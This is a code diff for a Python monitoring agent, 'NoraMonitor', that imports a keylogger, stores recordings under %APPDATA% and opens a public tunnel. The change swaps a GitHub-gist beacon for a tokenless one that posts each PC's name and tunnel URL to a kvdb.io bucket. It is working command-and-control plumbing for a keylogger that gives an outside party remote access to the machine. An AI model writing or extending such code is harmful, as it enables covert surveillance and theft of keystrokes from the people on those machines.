@@ -1,10 +1,10 @@
 import os
 import re
 import json
-import datetime
 import subprocess
 import threading
 import urllib.request
+import urllib.parse
 
 import server
 import keylogger as kl
@@ -19,6 +19,8 @@ PORT = int(os.environ.get("NORA_PORT", 9090))
 _APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
 _RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
 _CONFIG_FILE    = os.path.join(_APP_DIR, "config.json")
+
+KVDB_BASE = "https://kvdb.io"
 
 
 def _load_config():
@@ -37,61 +39,19 @@ def _save_config(cfg):
         pass
 
 
-def _ensure_gist(token):
-    """Create gist on first run, return gist_id."""
-    payload = json.dumps({
-        "description": "Nora Monitor Agent URLs",
-        "public": False,
-        "files": {"nora_agents.json": {"content": "{}"}}
-    }).encode()
-    req = urllib.request.Request(
-        "https://api.github.com/gists",
-        data=payload, method="POST",
-        headers={
-            "Authorization": f"token {token}",
-            "Content-Type": "application/json",
-            "Accept": "application/vnd.github.v3+json",
-            "User-Agent": "NoraMonitor"
-        }
-    )
+def _ensure_bucket():
+    """Create a new kvdb bucket and return its ID."""
+    req = urllib.request.Request(KVDB_BASE, data=b"", method="POST")
     with urllib.request.urlopen(req, timeout=10) as r:
-        return json.loads(r.read())["id"]
+        return r.read().decode().strip()
 
 
-def _post_to_gist(tunnel_url, pc_name, token, gist_id):
-    try:
-        # Fetch existing content and merge
-        req = urllib.request.Request(
-            f"https://api.github.com/gists/{gist_id}",
-            headers={
-                "Authorization": f"token {token}",
-                "Accept": "application/vnd.github.v3+json",
-                "User-Agent": "NoraMonitor"
-            }
-        )
-        with urllib.request.urlopen(req, timeout=10) as r:
-            data = json.loads(r.read())
-            existing = json.loads(data["files"]["nora_agents.json"]["content"])
-    except Exception:
-        existing = {}
-
-    existing[pc_name] = {
-        "url": tunnel_url,
-        "updated": datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    payload = json.dumps({
-        "files": {"nora_agents.json": {"content": json.dumps(existing, indent=2)}}
-    }).encode()
+def _post_url(bucket_id, pc_name, tunnel_url):
+    key = urllib.parse.quote(pc_name, safe="")
     req = urllib.request.Request(
-        f"https://api.github.com/gists/{gist_id}",
-        data=payload, method="PATCH",
-        headers={
-            "Authorization": f"token {token}",
-            "Content-Type": "application/json",
-            "Accept": "application/vnd.github.v3+json",
-            "User-Agent": "NoraMonitor"
-        }
+        f"{KVDB_BASE}/{bucket_id}/{key}",
+        data=tunnel_url.encode(),
+        method="POST"
     )
     urllib.request.urlopen(req, timeout=10)
 
@@ -115,20 +75,20 @@ def _start_tunnel(port):
                     import time; time.sleep(2)
                     server.broadcast_ngrok_url(tunnel_url)
 
-                    # Push URL to gist if configured
                     cfg = _load_config()
-                    token   = cfg.get("github_token", "")
-                    gist_id = cfg.get("gist_id", "")
-                    pc_name = cfg.get("pc_name", "PC")
-                    if token:
+                    pc_name   = cfg.get("pc_name", "My PC")
+                    bucket_id = cfg.get("bucket_id", "")
+                    if not bucket_id:
                         try:
-                            if not gist_id:
-                                gist_id = _ensure_gist(token)
-                                cfg["gist_id"] = gist_id
-                                _save_config(cfg)
-                            _post_to_gist(tunnel_url, pc_name, token, gist_id)
+                            bucket_id = _ensure_bucket()
+                            cfg["bucket_id"] = bucket_id
+                            _save_config(cfg)
                         except Exception:
-                            pass
+                            break
+                    try:
+                        _post_url(bucket_id, pc_name, tunnel_url)
+                    except Exception:
+                        pass
                     break
             proc.wait()
         except Exception:
